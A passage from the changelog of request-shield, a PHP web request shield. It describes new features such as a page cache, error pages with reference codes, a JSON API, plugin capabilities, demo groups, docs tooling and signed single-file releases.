  what Ibexa (FOSHttpCache, xkey, `X-Cache-Tags`, the user context hash),
  eZ Publish legacy / Exponential, LiteSpeed (`X-LiteSpeed-*`), Varnish,
  Magento and the CDNs send to their caches; proposed: read their tags,
  accept their purges (in the answer, `PURGE`, `PURGEKEYS`), one page per
  role (told by a CMS adapter in the same PHP process, or the user context
  hash; a role cookie is refused as forgeable), answers in APCu with the
  disk only when needed, cleaning up by itself -- so a site can switch to a
  Varnish later without changing the application; and how it replaces
  Exponential Platform's `AppCache` (its `xkey` tags, `PURGE` with `key`,
  roles by `X-User-Hash`).
- **A page cache for small sites** (0031 step G.2, RSF04-03, the `cache`
  edition): `set http-cache on` keeps the public answers of a site without a
  cache of its own (200, 301, 308; no cookie set, not private, within
  `http-cache-max-object`) for `s-maxage`, `max-age` or `http-cache-ttl`, and
  answers the next request for them before the application runs (`Age`,
  `X-RS-Cache: hit`, 304 for a known ETag) -- only on the host names
  `http-cache-hosts` lists, only whole answers (not what `ob_clean()` threw
  away, not one ended early, not one encoded by the application), and it
  cleans up expired answers by itself. Visitors with a login cookie, an
  `Authorization` header or a form are never served from it; harmless cookies
  (`http-cache-cookies`: analytics, the shield's pass) do not count.
  `request-shield cache <rules> purge [--path=…] | expired` and the API's
  `GET /cache`, `POST /cache/purge`. Off by default; nothing of it loads then.
- **Proposal 0038 without JavaScript, and without friction** (Draft): why no
  captcha (models solve them, Google's value is its risk score, every person
  pays); instead a fallback for visitors without JavaScript (a signed form and
  a short wait, a few uses an hour) and two invisible signals in the form --
  a honeypot field and the time it took -- that bring the check, and a
  refusal only when both say "program".
- **Error pages, part 3: the reference** (proposal 0030, 0031 step G.1,
  RSF05-06): every refusal the shield answers with its page gets eight random
  characters (`7KQ2-M4XD`) -- on the page with the time, in the JSON and in
  the log line (`ref=…`, read back by the live view and the API). A visitor
  sends it, support finds the one line; the page never says which rule.
- **Proposal 0037 named values** (Draft): `addresses office 192.0.2.0/24 …`,
  `paths admin /admin/** …`, `agents`, `hosts` -- written once, used bare in
  every rule (`restrict admin to office`, `exempt office`, `expect … from
  office`), resolved when the rules are compiled.
- **Error pages, part 2: the site's own page** (proposal 0030, 0031 step
  G.1, RSF05-06): `set error-page 404 errors/404.html`, `4xx` for every status
  the shield refuses with, `{lang}` in the name for one per language, also in
  a site block. Read when the rules are compiled (at most 64 KB, UTF-8; a
  missing or wrong file names its line), kept in the compiled settings
  (format 53); placeholders `{status}` `{title}` `{text}` `{wait}` `{home}`
  `{lang}` `{reference}` filled in and escaped. Rules & setup shows which
  statuses have one. The feature has its page and its demo group.
- **Use case: the sign-in, hardened -- three tries, then longer and longer**
  (`docs/use-cases/login-backoff.md`): the application counts each wrong
  password (`consume('logins', answer: true)`), `limit logins 3/15m on-demand
  at /login` and `ban after 1 logins in 15m for 1m` with `ban-growth 2` --
  three tries, then a pause and bans of 1, 2, 4, 8 minutes; or the browser
  check instead, twice as hard each round. A test runs the page's own rules
  and holds them to what it says.
- **Error pages, part 1: the shield's own page** (proposal 0030, 0031 step G.1,
  RSF05-06): a refusal the shield answers itself gets the check page's frame --
  a quiet ring with a `:-(` drawn in SVG, or the site's logo (`set
  challenge-logo`), a title and one sentence in the visitor's language (English
  and German built in, each replaceable: `set text.de.not-found-text …`), how
  long to wait after too many requests, the way home. It never says why.
  Inline CSS and SVG, no script, nothing loaded, and a CSP that keeps it so
  (`default-src 'none' … frame-ancestors 'none'`); a site's own page (the
  Pages hook) and the check page get none of the shield's. A program
  (`api-path`, a request that asks for or sends JSON) gets
  `{"status", "error", "retryAfter"}` instead. The titles in English are
  plainer now ("Not found", "No access", "Not here").
- **The replay: your own clicks as a test** (proposal 0016, first part;
  RSF05-04): `request-shield replay <main.rules> <recording>` sends requests
  known to be good through the rules -- a session recorded as a HAR file (the
  browser's developer tools, Playwright's `recordHar`), a web server's access
  log (its 2xx and 3xx), or a list -- each different request once, on a fresh
  store, nothing counted, the rules switched on as for `test`. It lists what
  would be refused, with its rule (exit 1), and what gets the browser check;
  `--junit` for CI. Only the shape is read: never a cookie, a token or a body;
  static files and other websites' addresses are left out.
- **The demo's "Show the answer" shows the request and the answer**: the
  request as the browser sends it (request line, Host, the row's headers, the
  User-Agent, the pass cookie for a row "with pass", how often it is sent),
  the answer's status line and the headers the shield sends, and what it does
  with cookies -- none, a pass sent along, or the browser check, which needs
  cookies and leads to the pass cookie `rsp` (technically necessary, no
  tracking) -- then why, step by step.
- **Use case: a developer hardens the application, and tests it**
  (`docs/use-cases/harden-and-test.md`): a rule file next to the code -- known
  parameters, `query strict`, `allow POST`, `post-origin`, `restrict`, a pace
  for the login, `@attacks` -- with an `expect` line for what must be refused
  and what must get through; `request-shield check` and `test --junit` in CI
  like unit tests, `trace` for one request, monitor before enforce. Every rule
  and example on the page passes `test`.
- **The API's writes are on the record** (0031 step G.0): each one is a line
  in the log (rule `api-write`, the method and the path, at every log level)
  and an event to every sink -- never its parameters.
- **The API, part 5: the pages read it** (0031 step G.0, RSF06-05): the live
  view asks the API's `GET /live` for new rows, the statistics' JSON button
  opens `GET /stats/report`; the pages' own `?format=json` is gone. Without the
  API (the mini file alone, `set api off`) the live view shows the rows as it
  was opened and says what refreshes it. A site that serves `LivePage::json()`
  itself, as a feed of its own, keeps working.
- **The API, part 4: its contract** (0031 step G.0, RSF06-05):
  `tests/ApiContractTest.php` calls every endpoint every provider declares and
  checks its answer against the schema the endpoint declares, and that
  `Api::call()` and HTTP send the same bytes for every endpoint that reads --
  a new endpoint is in it by itself. It found one mistake: `POST /lists`
  without `for` now keeps an address out for a week, as the page's form does.
- **The API, part 3: the statistics, the description, the feature** (0031
  step G.0, RSF06-05): the statistics add `GET /stats/report` and
  `GET /stats/sites` as an `ApiProvider` -- a customer's token gets its group
  and not the rules that decided. `GET /openapi.json` and `/openapi.yaml`
  describe every endpoint (OpenAPI 3.1, the plugins' included);
  `docs/reference/api.md` and `docs/reference/openapi.yaml` are written by
  `gen-reference.php`; `request-shield api --openapi[=yaml]` prints it. The
  feature has its page (`docs/features/RSF06-05-api.md`) and its demo group.
- **The API, part 2: the core's endpoints** (0031 step G.0, RSF06-05):
  `GET /rules`, `POST /trace`, `POST /test`, `POST /check`, `GET /live`,
  `GET /lists`, `GET /feeds`, `GET /crawlers`, `GET /log`; and the writes, only
  with `set api-write on` and for the administrator: `POST /reload`,
  `POST /lists` (and `/lists/update`, `/lists/remove`, `/lists/lift`),
  `POST /feeds/update`. Each answers what the command line and the pages show
  -- the same functions; the lists with the page's own checks (no trusted
  proxy, not the caller's own address, a wide range only with `confirm`). A
  write is a POST: DELETE is not among the methods a site accepts by default.
  `check`'s warnings are one function the command line and the API share.
- **The API, part 1: the host** (0031 step G.0, RSF06-05): `plugins/api` serves
  the shield's data as JSON below `<dashboard-path>/api/v1`, guarded like the
  dashboard (a restrict rule, or `Authorization: Bearer <token>`); every answer
  is `{data, meta: {version, generated, tier}}` with an ETag on the data, every
  problem RFC 9457 JSON -- never the login form. `GET /status` and
  `GET /openapi.json` to start; `Api::call()` answers in the same process what
  HTTP answers. `set api off`, `set api-write on` (writes, off by default),
  `set api-origins` (CORS, none by default); `check` says what keeps a script
  from it where one may call it. An extension adds endpoints as an
  `ApiProvider`. `request-shield api <main.rules> "GET /status"` calls one;
  the edition `request-shield-api.php` is built, released and self-updated with
  the others. The shipped extensions are named in `plugins/shipped.php`.
- **Every feature is reachable from where it shows** (0031 step F.9, part 5):
  on Rules & setup every step of the way and every group of settings has the
  `?` of its feature; `request-shield test` with a failure links how examples
  are read; the feature contract asks every feature's page for a picture and
  the shield for a link to it -- three features without one are listed with
  their reason.
- **The docs' screenshots come from the demo** (0031 step F.9, part 4):
  `docs/tools/screenshots.php` records the demo with `request-shield examples
  --html` and takes the pictures with a headless Chrome -- the recorded page on
  the examples page, attack patterns and budgets on theirs.
- **No page without a diagram** (0031 step F.9, part 3): the 17 feature pages
  and 5 use cases that had no picture got one, drawn from text in
  `docs/diagrams/`; `DocsStyleTest`'s list of pages without one is empty.
- **Every page explains itself** (0031 step F.9, part 2): each page of the
  dashboard -- rules & setup, live, lists, the login, the statistics' views
  and cards -- has a `?` after its title and on every section, to the place in
  the docs that explains it (`tests/UiHelpTest.php` follows every link to its
  heading). A part with nothing to show says how it gets something ("a row
  appears as soon as the shield refuses …", "pick a longer period …"). The
  check page and the box in a form link visitors to the check in plain words
  (the text `about`: "What is this check?"). A mistake on the command line
  ends with where it is explained: the feature of the rule file's line, or
  the settings page.
- **The pages can explain themselves** (0031 step F.9, part 1): `Help` renders
  a feature's sentence (English, German) and its `?` link to the feature's
  page from `Vocabulary::TOPICS`; `set docs-url` says where the docs are (the
  repository's by default, a copy of your own, or `off`: no links, the
  sentences stay). `docs/tools/check-anchors.php` finds every anchor a link
  points at, in the docs and in the code's `Help` calls; it found one dead
  link in this changelog.
- **Use case: a pentest asks for rate limits on the forms**
  (`docs/use-cases/form-rate-limits.md`): forms built by a script and sent as
  JSON to one endpoint get `allow POST`, `post-origin same` and a budget on
  the endpoint, watched first, with `expect` lines as the proof; one limit
  per kind of form through `consume()`; the limits named (the 429 is HTML
  until 0030, per address only). Proposal **0034 budgets for everyone
  together** (Draft): one counter for all senders of a form, and how not to
  lock out real applicants with it. Proposal 0030 answers in JSON a request
  that sends JSON. The use case shows the browser check before sending: on
  opening a job offer (rules only, with its costs), or when the form is sent,
  its script solving the task (ten lines, tried against a real server);
  proposal **0035 the check for forms that send JSON** (Draft) makes that a
  promised `RS.fetch()`. Proposal **0036 forms per page** (Draft): for each
  page, how often it was viewed, how often a form was sent from it and how
  often that succeeded -- the outcome per page, an optional header that says
  how it ended, more pages per form, the check's task not counted as a send.
- **Docs for people, by role, in plain language** (0031 step F.8):
  `docs/for/` has a page each for admins, hosters, editors, customers and
  developers -- what they see, what the numbers mean, what to do when, and a
  typical day, each with its diagram; `docs/glossary.md` explains 36 words.
  CONTRIBUTING has a section "Plain language", and `tests/DocsStyleTest.php`
  checks it: glossary words linked, no sentence over 30 words on the pages
  for people, and a picture on every page (the pages still without one are
  listed, 0031 F.9 empties the list). The browser check's explanation has
  shorter sentences.
- **Diagrams from text, and the demo on GitHub Pages** (0031 step F.7):
  `docs/diagrams/*.dg` -- a title, rows of boxes, arrows, a note -- become
  SVGs in the shield's house style, light and dark (`docs/tools/diagram.php`,
  `--check` in the tests); the first three show blocked paths, attack
  patterns and the single file on their pages. `.github/workflows/pages.yml`
  publishes the demo as `request-shield examples … --html` records it, with
  the diagrams (the repository's Pages setting must be "GitHub Actions").
- **The feature contract is met** (0031 step F.6): every feature has its page,
  its tests, a demo group with an effect and a near miss (or its reason in
  `examples/demo/.demo-exempt`: settings, the single file, plugins, the two
  that the page's every row already shows -- examples and rule IDs -- and the
  two the page itself decides), and every request-path feature an end-to-end
  test; the contract's lists of gaps are empty.
- **The demo shows site blocks and strict mode** (0031 step F.6, RSF05-01):
  `site strict.example { set mode strict … }` -- a rule of one website, and
  strict mode there (eleven made-up addresses count as 22); the other website
  is not touched. The demo page and `request-shield examples` read the
  examples inside site blocks too, each row knows its website.
- **Blocked paths have their page** (0031 step F.6, RSF02-02):
  `docs/features/RSF02-02-blocked-paths.md` -- `@scanners` and `@wordpress`
  rule by rule, a path of your own, taking one back or opening it somewhere,
  what it costs, and that on a site without a front controller the shield
  sees only what reaches PHP. Every feature has its page now.
- **Attack patterns have their page, and the demo shows them** (0031 step F.6,
  RSF02-06): `docs/features/RSF02-06-attack-patterns.md` -- what `@attacks`
  looks at, the 15 rules, a pattern of your own, what it costs (about 1.4 µs
  per request, about 3.5 µs with a free-text parameter) and where it stops
  (no form bodies); the demo includes `@attacks`: script and disguised SQL in
  the search, an attack tool by its name, a search that only looks alike.
- **The demo shows forms only from the website itself** (0031 step F.6,
  RSF02-04): `post-origin same missing allow` -- a form sent from another
  website is refused, one from the site's own pages passes, one without Origin
  and Referer too. Every request-path feature has an end-to-end test now.
- **The demo shows a crawler that proves who it is** (0031 step F.6,
  RSF01-04): DemoBot, a crawler of the demo's own with its address list in
  `examples/demo/crawlers/demo-bot.json` (documentation ranges), blocked by the
  site -- from its addresses it is believed, the same name from elsewhere is an
  ordinary visitor.
- **`feed <name> from <file>`, and the demo shows a blocklist** (0031 step
  F.6, RSF01-03): a list of the site's own in a file beside the rules -- read
  when they compile, watched like a rule file, never fetched and never too
  old (`feeds … update` leaves it alone); for a server without the internet,
  or a demo. The demo keeps out `feeds/demo-blocklist.txt` (documentation
  ranges). `request-shield test` decides a feed line's example instead of
  skipping it as not in effect.
- **The demo shows the deny list and bans** (0031 step F.6, RSF01-02): an
  address kept out (`[DEMO-DENY] deny 203.0.113.66`) next to its neighbour,
  and a scanner banned at its sixth refusal (watched in the demo, decided
  switched on by `test`). `DemoTest` proves a watched rule by the log line on
  the page, not by the answer.
- **The demo shows trusted proxies** (0031 step F.6, RSF01-01): a group with
  the admin area behind the proxy `198.51.100.1` -- through it the visitor's
  address decides, the header from anyone else is not believed. The page's
  answer reads `X-Forwarded-For` as the rules do (`Inspector::request()` takes
  the trusted proxies).
- **Each demo group is its feature's end-to-end test** (0031 step F.6): `DemoTest`
  runs every `# demo:` group on a real server under the feature's id -- each
  `expect` row sent through the shield as a real request from the example's
  own address (the test server trusts 127.0.0.1 as a proxy:
  `trust ${REQUEST_SHIELD_DEMO_TRUST:-…}` in the demo's rules), its answer
  (status, `X-RS`) held to the row, and the page's own answer too. The feature
  contract reads the test names as the runner loaded them. Request-path
  features without an end-to-end test: 10 → 3.
- **The reference and the examples from one source** (0031 step F.5):
  `src/Rules/Reference.php` holds every rule and set key in words (taken from
  the rule files page's two tables, which are written from it now, plus rows
  for `match`, `site`, `ids`, `version`, `replace`, `plugin`);
  `docs/tools/gen-reference.php` writes those tables and `docs/reference/`
  (`rule-files.md`, `settings.md`, `cli.md`), each row with its feature;
  `docs/tools/sync-examples.php` puts each feature's demo group into its page.
  New commands: `request-shield vocabulary [--json]` and `request-shield
  examples <rules> --markdown [--feature=…] | --html [--out=…] | --coverage`
  (the `--html` page is the demo recorded by `test`, for a static host).
  Both tools have `--check`, which the tests run.
- **The demo from its rules** (0031 step F.4): the demo's front page draws its
  rows from the `# demo:` groups at the end of `examples/demo/request-shield.rules`
  (13 groups, one per feature, 53 examples -- `request-shield test` decides
  the same lines), through `Report\DemoSite` and `Report\ExamplesPage`;
  "Show the answer" is decided on the server (`/__answer`) with the live rules
  and store, nothing counted; the site's pages moved to `pages.php`.
  `DemoTest` goes through every group and row. `expect … by built-in` names a
  fixed check without an ID; `Shield::store()` gives the store a shield counts
  in.

- **Demo groups and more for `expect`** (0031 step F.3): `# demo: RSF02-06
  <slug> <title>` opens a group in a rule file -- the comment lines below
  explain it, the examples after it belong to it -- and `# try: GET /path
  <what to look at>` is a row that is shown, not decided; `expect … ua
  "<User-Agent>"` sets the visitor's User-Agent, and a header value may be
  quoted (spaces, `\"`). Each example's result carries the status and the
  headers the visitor would get (`Responder::headerLines()`). The feature
  contract reads the groups from the parser now.
- **The feature contract** (0031 step F.2): `tests/FeatureContractTest.php`
  holds every feature of the docs index to its parts -- a page, tests under
  its id, an end-to-end test on the request path, a `# demo:` group with an
  effect and a near miss (or a reason in `examples/demo/.demo-exempt`) -- and
  every rule word and set key to its feature (`Vocabulary::FEATURES`); the
  other way, every id a test, a demo group or a list names must be a feature.
  What is missing today is a list in the test that only shrinks (step F.6
  empties it): two features without a page, 22 without a demo group, 10
  without an end-to-end test under their id.
- **Feature ids** (0031 step F.1): every feature page's title begins with
  its id `RSF<gg>-<nn>` (`# RSF02-03 Access rules …`) and its file is named
  by it (`docs/features/RSF02-03-access-rules.md`), `docs/README.md` lists
  the features as a table by id -- the five without a page of their own yet
  (RSF02-02, RSF02-06, RSF04-02, RSF05-06, RSF06-05) named where they are documented
  or planned -- and every feature's tests begin with its id.
  `php tests/run.php RSF02-06` runs exactly that feature's tests, `RSF02` its
  group. RSF05-07 is new: the single file and its releases.
- **The guides for agents** (0031 step E.7): `docs/llm/install.md` (find
  the places, download and verify, `init`, the shield's own directory for the
  PHP user, switch it on and see that it is on, see it work, report),
  `docs/llm/write-rules.md` (what to look at in an application and which line
  each finding becomes, every example checked with `test`) and
  `docs/llm/check.md` (`check`, `test`, `trace`, the log, when to enforce).
  The install guide was followed literally in a `php:8.0-apache` container;
  `docs/llm/install-dryrun.md` holds the log and what the first pass found:
  a shield directory PHP could not write to (the shield let everything
  through and logged nothing -- `check` as root did not show it), and
  `/.env` never reaching PHP on a site without a front controller.
  `tests/LlmDocsTest.php` holds every command and option the guides name to
  the command line. The install prompt and `llms.txt` follow them.
- **`init`, `verify`, `self-update`** (0031 step E.6): `request-shield init
  --app=plain|wordpress|symfony|exponential` writes a commented starter rule
  file in monitor mode (refused inside `--docroot`, or over a file without
  `--force`); `verify <file>` checks the checksum from `SHA256SUMS` and, with
  a release key and sodium, the minisign signature (pure PHP,
  `Release\Minisign`); `self-update [--check] [--to=vX.Y.Z] [--major]`
  replaces the single file and the statistics file beside it with a signed
  release, every file checked before any is replaced, the old ones kept as
  `.prev`. Until the release key exists, `verify` checks the checksum only and
  `self-update` refuses.
- **The release workflow** (0031 step E.5): a tag `vX.Y.Z` on `main` is
  checked (`build/release-check.php`: `Shield::VERSION` and the changelog's
  section name it), every edition is built twice and compared, the suite runs
  against the built file, and `request-shield.php`, `request-shield-stats.php`
  and `SHA256SUMS` are published with a build provenance attestation and the
  changelog's section as notes. Actions pinned by commit. The minisign
  signature comes with the release key, later.
- **CI plans its legs per event** (0031 step E.4): a `plan` job asks
  `build/ci-plan.php` -- a pull request runs 3 legs (PHP 8.0 file store, 8.4
  APCu, 8.4 APCu against the single file) plus minimal hosting, a push to main
  14, nightly and by hand all 24 plus a check that two builds of every edition
  are byte-identical. `tests/CiPlanTest.php` holds the numbers.
- **The suite runs against the single file** (0031 step E.3):
  `REQUEST_SHIELD_ENTRY=<built request-shield.php> php tests/run.php` loads
  the built file (and the statistics file beside it) instead of
  `bootstrap.php`; every end-to-end server and command-line test takes the
  library from `rsEntry()` and `rsCli()`. CI runs it as the leg `single` and
  checks the built file with `php -l` on every PHP version.
- **The single file** (0031 step E.2, proposal 0002): `php build/single-file.php`
  builds `request-shield.php`, the mini edition in one file -- the core, the
  command line and the shipped rule sets embedded; included it protects the
  site with the rules it finds (bootstrap.php's order), run directly it is the
  command line. `--edition=stats` builds the statistics as
  `request-shield-stats.php`; `waf` and `api` say which step they wait for.
  Deterministic; every declaration is conditional, so a second include (with
  or without OPcache) does nothing. `tests/SingleFileTest.php` builds both and
  puts a request through the file; `bench/single-file.php` compares it with
  the source tree. See [the single file](docs/features/RSF05-07-single-file.md).
- **`Rules\Shipped`, the one reader of `rules/`** (0031 step E.1): the
  shipped rule sets, the feed catalog, the crawlers' address lists and the
  ready crawlers are read through one class, so the single-file build (E.2)
  can embed them -- with its constants filled nothing reads `rules/`, and the
  file that holds the data is watched instead (an update rebuilds the
  settings). `Settings::RULES_DIR` and `RuleFile::shipped()` are gone (a
  plugin calls `Shipped::crawlers()`, `Shipped::rules()` …); a shipped
  address list is named `@<name>` where a path stood
  (`RuleFile::crawlerListFiles()`, `CrawlerLists::read()`/`update()`).
  `RuleFile::shippedReady()` is what `rules/crawlers.php` holds, as an array.
- **The plugins guide rewritten around extensions** (0031 step D.3):
  `docs/features/RSF06-04-plugins.md` explains the two interfaces (`Extension` at
  compile time, `Plugin` per request), the capabilities, `plugin … from`, the
  served pages and the commands in one place; ADR 0008 (extension points
  resolved at compile time) and ADR 0009 (plugins tighten, never loosen) are
  accepted. With this, phase D of 0031 (CLI and namespace) is complete.
- **The statistics plugin in its own namespace, and plugins from a file**
  (0031 step D.2): `plugins/stats/src` is `CjwNetwork\RequestShield\Stats\…`
  (`Stats\StatsExtension`, `Stats\StatsPlugin`, `Stats\Report\StatsPage`, …;
  composer.json and the bootstrap's autoloader map it); `plugin <class> from
  <file>` names the file that holds a plugin for a site without Composer --
  loaded when the rules are compiled and when the shield makes its plugins, a
  file that is not there is a warning (`check` names it) and the plugin is
  left out. Compiled settings format 50.
- **The extensions' commands** (0031 step D.1): `Extension::commands()`
  names the commands an extension adds to `bin/request-shield` (name => a
  `Cli\Command` with `usage()` and `run(Cli\Context)`); the script runs them
  from a table, after reading the rules and parsing the common options, and
  its usage lists their lines. `stats` is the statistics plugin's command now
  (`plugins/stats/src/Cli/StatsCommand.php`); its syntax is unchanged.
- **The Handler capability** (0031 step C.4): a plugin answers a passing
  request itself, after every rule, the check and the shield's own pages --
  an HTTP cache hit, a page of its own -- with a `Response` that goes out as
  it is; null means on to the application, a failure is noted once a minute
  and the application runs; one array access when no plugin has it.
  `Request::cacheKey()` names an answer for a cache (scheme and host lower
  case, the routed path, the parameters sorted). Compiled settings format 49.
  With this, phase C of 0031 (the rule chain) is complete.
- **The RuleProvider capability** (0031 step C.3): a plugin adds rules of
  its own to the chain -- steps with a key, a stage (never before the lists)
  and a rule; the shield puts each after its stage's steps, the trace and the
  rules page show it like any other, `Rule::explain()` names it. A provided
  rule can only tighten; one that throws says nothing for that request and
  is noted once a minute, a provider that throws adds nothing. The rules page
  draws "the way" from the chain (the post-origin step was missing there).
  Compiled settings format 48.
- **Each rule names its own decisions** (0031 step C.2): `Rule::explain()`
  gives the rule behind a decision (the ID or file:line it was written at,
  `built-in` for a fixed check) and null for any other; `Shield::explain()`
  asks the chain's rules and names only what no rule produces (an
  always-checked path, a `check` feed, the application's own check, a budget
  the site counts itself). The log and the pages read as before.
- **The rule chain is one list** (0031 step C.1): `Shield::chain()` returns
  the steps the shield checks, in order, each with a key and a stage
  (`Rule\Step`, derived from the rules when a trace or a page asks -- a
  request pays nothing; a step whose settings are not in use has no rule);
  `request-shield trace` and the rules page's tester walk that list instead of
  a copy of their own -- a rule added to the chain shows up in the trace by itself.
- **The Pages capability** (0031 step B.10): a plugin draws the pages the
  shield answers with itself -- the refusal page (`error`), the browser check
  (`challenge`) and the dashboard's login form (`access-login`) -- in the
  site's look; null or a failure means the shield's own page (a failure is
  noted once a minute). Headers and cookies stay the shield's; asked only when
  the shield answers itself, never for a passing request. Compiled settings
  format 47. With this, phase B of 0031 (decoupling) is complete
  ([docs](docs/features/RSF06-04-plugins.md#capabilities-what-a-plugin-can-do-for-the-pages)).
- **The Sink capability** (0031 step B.9): `Log::note()` hands its record --
  every request the shield did something about -- to the live view and to
  every plugin with `Sink` (`$s->hooks['sink']`, recorded when the rules are
  compiled); a sink that throws is left out for that request and noted in
  PHP's error log once a minute, the log and the other sinks still get it. The
  live view is the first sink (`Live` implements it). Compiled settings format
  46 ([docs](docs/features/RSF06-04-plugins.md#capabilities-what-a-plugin-can-do-for-the-pages)).
- **Capabilities on plugins, the first: RuleCounts** (0031 step B.8): the
  compiler records which plugin class implements which capability into the
  compiled settings (`hooks`, by `instanceof` when the rules are compiled); the
  rules and setup page asks `Report\Counts`, which asks the plugins with
  `RuleCounts` (the statistics plugin has it) -- the core's pages name no
  plugin any more. Rules & setup is the core's page in the core's frame with
  its own styling; the statistics page has no `rules` view (its tab leads to
  the core's page). Compiled settings format 45
  ([docs](docs/features/RSF06-04-plugins.md#capabilities-what-a-plugin-can-do-for-the-pages)).
- **Who may open the dashboard is the core's, who sees what is the pages'**
  (0031 step B.7): `dashboard-access "<principal>"|* sha256:<hash> [until
  <day>]` and `set dashboard-session` replace `stats-access` and
  `stats-session`; the principal is an opaque id to the shield (`"Customer A"`
  → `customer-a`, a signed link or a token for any id holds), and the
  statistics map it to the `stats-group` of the same name -- `stats-group` is
  the statistics extension's word now (`ext.stats.groups`), a principal
  without a group sees no statistics and `check` says so. The CLI command is
  `access-token` (was `token`). Compiled settings format 44
  ([docs](docs/features/RSF06-03-statistics.md#who-sees-what-tokens-a-login-signed-links)).
- **The shield serves the dashboard's pages itself** (0031 step B.6): a
  request for a route below `dashboard-path` (`/rs/waf/live`, `/rs/stats/…`,
  an extension's own) is answered before the application -- behind
  `Access::gate()` and the route's role (`admin` pages refuse a customer with
  403), `no-store` and `noindex` on every answer, a POST change with the
  page's token. A route's `page` names the class that serves it
  (`RoutePage::serve()` returns a `Response`); the core's pages, the
  statistics' and the test extension's have one. A route nobody guards (no
  `restrict` rule covers it, no login) answers 403, and `request-shield check`
  warns, naming the rule to add (`restrict /rs/** to <addresses>`). The demo
  wires nothing any more; a customer asking an administrator's page gets 403
  instead of a reduced view. Every offered extension now compiles, with an
  empty slot when the rules said nothing of it, so its defaults, routes and
  plugins apply ([docs](docs/features/RSF06-04-plugins.md#extensions-words-and-settings-of-their-own)).
- **`Extension::plugins()`**: an extension names the `Plugin` classes to run per
  request given its compiled slot; the compiler appends them to the settings'
  plugins, so `Shield` no longer adds `StatsPlugin` itself (0031 B.4) and the
  `check` warning about a missing statistics plugin comes from
  `StatsExtension::check()` (`request-shield check` asks every offered
  extension). `Vocabulary::set()` takes `serverWide` (refused inside a site
  block) and `many` (one key, several values: `set stats on|off|<parts>`),
  `Vocabulary::word()` takes `paths` (the parser compiles the paths, inside a
  match block the block's), and the type `path` is there for extensions.
- **Extensions: words and settings of their own** (0031 step B.2, ADR 0008):
  a class implementing `Extension` registers rule words and `set` keys with
  `Rules\Vocabulary` (`word()`, `set()`, typed like the core's); the parser
  asks the registry before it calls a word or key unknown, writes into the
  extension's slot `ext.<id>` only, and `Extension::compile()` checks the
  slot with the base settings in hand when the rules are compiled. Offered
  by `plugin <class>` (from that line on) or, for the shipped ones the
  bootstrap names (`REQUEST_SHIELD_EXTENSIONS`), on the registry's first
  lookup; a request pays nothing. `tests/support/RsTestExtension.php` is the
  smallest one (`set fail-at <stage>` for the fail-safe tests)
  ([docs](docs/features/RSF06-04-plugins.md#extensions-words-and-settings-of-their-own)).
- **Settings carry the extensions' slots** (0031 step B.1): `ext` (extension
  id => its checked settings), `hooks` (capability => the plugins that have
  it) and `routes` (the pages under `dashboard-path`) are the last constructor
  parameters of `Settings`, checked for shape, compiled, exported and imported
  like every other setting; the core reads none of them yet (B.2 onwards fill
  them). Compiled settings format 41: every installation compiles once more
  after the update, nothing to do.
- **The bytes on the wire have limits** (0031 step A2.3, ADR 0014 accepted):
  `tests/WireBytesTest.php` holds them as numbers -- the pass cookie at most
  48 bytes with its name (today 47), the check page at most 4096 bytes
  gzipped (today 4065), the headers the shield adds to the check page and to
  the answer that hands out the pass, and no header or cookie of the shield
  on a passing request unless `debug-header` is on; `bench/overhead.php`
  prints the sizes ([docs](docs/features/RSF03-02-browser-challenge.md#cost)).
- **Fail safe** (0031 step A.2, ADR 0007): an exception anywhere inside
  `Shield::protect()`, `protectFile()`, `requirePass()`, `consume()`,
  `widget()` or the check the application asks for lets the request through
  as `allow-uncached` with the reason `shield error`; PHP's error log gets one
  line a minute per cause -- across requests and workers too (APCu, else a
  marker in the store directory), so a broken deploy is one line a minute,
  not one per visitor. Before, a throwing hook or store was a 500 for the
  visitor. `tests/RobustnessTest.php`.
- **A rule file that does not compile never takes the site down** (0031 step
  A.3): on the request path the last good compiled settings stay in force
  (one line a minute in the error log, a `.failed` marker until the file
  changes); at a first install the shield runs switched off and says so; a
  compiled settings file cut short is deleted and compiled anew.
  `Settings::load()` for tools still throws; `check` is where a mistake is an
  error ([docs](docs/features/RSF05-02-settings.md#when-the-rules-cannot-be-compiled)).
- **The tier an installation runs at** (0031 step A3.1, ADR 0013): `check`
  and `version site.rules` print S0 (no writable directory, no APCu: the
  stateless rules only, settings compiled on every request), S1 (files) or
  S2 (APCu), and what is not active in it ([docs](docs/features/RSF05-02-settings.md#what-this-installation-can-do-the-tiers)).

### Changed
- **The firewall's pages are a plugin** (0031 step G.3): Rules & setup, Live
  and Lists, the demo's pages and the `examples` command moved from
  `src/Report` to `plugins/waf` (namespace `Waf\`, the edition
  `request-shield-waf.php`, offered like the statistics); the mini file has
  no page of the dashboard now. What the core needs stayed in it, as
  `Inspector`, `Describe`, `Counts`, `LogTail`, `LogStats` and `Frame`
  (`trace`, the live log, the rule counts, the login page); what the API
  needs went to it (`Api\LiveRows`, `Api\ListsChanges`), so the WAF's pages
  read their data where the API does. Its routes carry `ext` `waf`;
  `Routes::core()` is gone. `Describe::ruleInfo()`/`anchor()` replace
  `SetupPage::rule()`/`anchor()`.
- **The command line is the class `Cli`** (0031 step E.2, first part):
  `src/Cli.php` holds what `bin/request-shield` was, `Cli::main($argv)`; the
  script is three lines that call it. The single file runs the same class
  when it is run directly. Commands, options, output and exit codes are
  unchanged; the tool's code is under PHPStan now.
- **The dashboard's pages are a registry** (0031 step B.5): `Settings::$routes`
  is compiled from the core's `<dashboard-path>/waf` pages (`Routes::core()`)
  and what every offered extension declares with
  `Extension::routes(array $compiled)` (its compiled slot in, full paths out):
  path => key, extension, tab labels (English, German), role `admin|reader`,
  order. Two routes on one path refuse to compile, naming both owners.
  `Frame::links()`, `isPage()`, `pageFor()` and `tabs()`, `StatsPage::links()`
  and `viewFor()`, `Shield::dashboardOnly()` (the pace's exemption for the
  dashboard's own requests, now without `Report` and without the stats path)
  and `Access::links()` (a reader's tabs are the routes whose role is `reader`)
  derive from it; `Frame::TABS` is gone, `Frame::tabs()` and `Access::links()`
  take the settings as their first parameter. `set stats-path` is the
  statistics extension's (`'ext' => ['stats' => ['path' => …]]` in PHP arrays,
  default `<dashboard-path>/stats`); `Settings::$statsPath` and `statsPath()`
  are removed. Compiled settings format 43: every installation compiles once
  more after the update, nothing to do.
- **The statistics are an extension** (0031 steps B.3, B.4):
  `plugins/stats/src/StatsExtension.php` registers `set stats`, `stats-flush`,
  `stats-months`, `stats-depth`, `stats-hours`, `stats-days`, `stats-hosts`,
  the `crawler-log` keys and the word `stats-skip` with `Rules\Vocabulary`
